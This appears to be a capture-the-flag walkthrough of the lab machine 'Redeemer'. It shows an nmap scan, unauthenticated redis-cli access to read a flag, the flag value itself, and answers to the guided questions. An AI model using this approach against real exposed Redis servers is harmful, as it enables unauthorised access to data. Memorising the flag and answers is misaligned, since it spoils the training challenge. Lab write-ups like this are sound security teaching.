# Redeemer

|            |                                                                              |
|------------|------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                                      |
| Difficulty | Very Easy                                                                    |
| OS         | Linux                                                                        |
| Tags       | Redis, Databases, Vulnerability Assessment, Reconnaissance, Anonymous Access |
| Tools      | `nmap`, `redis-cli` (from `redis-tools`)                                     |

## Summary

Unauthenticated Redis 5.0.7. The trick is remembering Redis isn't really a
"server you log into" - it's a command interface where the client just sends
plain text commands, so anyone reachable on TCP/6379 with a working
`redis-cli` is effectively root of the dataset.

## Solve

```bash
nmap -sT -p- --min-rate=3000 10.129.136.187
# 6379/tcp open  redis

redis-cli -h 10.129.136.187
> select 0
> keys *
1) "flag"
2) "temp"
3) "stor"
4) "numb"
> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

## Guided Tasks

| #  | Question | Answer |
|----|----------|--------|
| 1  | Which TCP port is open on the machine? | 6379 |
| 2  | Which service is running on the port that is open on the machine? | redis |
| 3  | What type of database is Redis? | In-memory Database |
| 4  | Which command-line utility is used to interact with the Redis server? | redis-cli |
| 5  | Which flag is used with the Redis command-line utility to specify the hostname? | -h |
| 6  | Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? | info |
| 7  | What is the version of the Redis server being used on the target machine? | 5.0.7 |
| 8  | Which command is used to select the desired database in Redis? | select |
| 9  | How many keys are present inside the database with index 0? | 4 |
| 10 | Which command is used to obtain all the keys in a database? | `keys *` |
